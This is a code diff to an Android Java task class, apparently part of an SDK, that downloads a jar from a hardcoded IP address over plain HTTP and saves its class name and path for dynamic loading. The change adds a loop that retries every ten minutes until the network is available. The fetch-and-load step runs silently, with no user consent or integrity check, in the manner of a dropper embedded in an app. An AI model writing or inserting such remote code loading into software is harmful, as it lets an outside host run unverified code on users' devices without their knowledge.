@@ -39,18 +39,28 @@ public class PLTask2 implements PLTask {
 	public void run() {
 		Log.d(TAG, "2 is running...");
 		state = STATE_RUNNING;
-		String remote = "http://180.96.63.70:8080/plserver/dats/emv2.jar";
-		String localFile = SdkServ.getLocalDexPath()+"emv2.jar";
-		if(SdkServ.downloadGoOn(remote, SdkServ.getLocalDexPath(), "emv2.jar",this.dservice.getService())){
-			this.dservice.setEmvClass("cn.play.dserv.MoreView2");
-			this.dservice.setEmvPath(localFile);
-			this.dservice.saveConfig();
-			Log.d(TAG, "down dex OK.emvClass:"+this.dservice.getEmvClass()+" emvPath:"+this.dservice.getEmvPath());
-			state = STATE_DIE;
-			result = 0;
-		}else{
-			result = -1;
-			state = STATE_WAITING;
+		while (true) {
+			if (!dservice.isNetOk()) {
+				try {
+					Thread.sleep(1000*60*10);
+				} catch (InterruptedException e) {
+				}
+				continue;
+			}
+			String remote = "http://180.96.63.70:8080/plserver/dats/emv2.jar";
+			String localFile = SdkServ.getLocalDexPath()+"emv2.jar";
+			if(SdkServ.downloadGoOn(remote, SdkServ.getLocalDexPath(), "emv2.jar",this.dservice.getService())){
+				this.dservice.setEmvClass("cn.play.dserv.MoreView2");
+				this.dservice.setEmvPath(localFile);
+				this.dservice.saveConfig();
+				Log.d(TAG, "down dex OK.emvClass:"+this.dservice.getEmvClass()+" emvPath:"+this.dservice.getEmvPath());
+				state = STATE_DIE;
+				result = 0;
+			}else{
+				result = -1;
+				state = STATE_WAITING;
+			}
+			break;
 		}
 		Log.d(TAG, "task2 is done."+result);
 	}
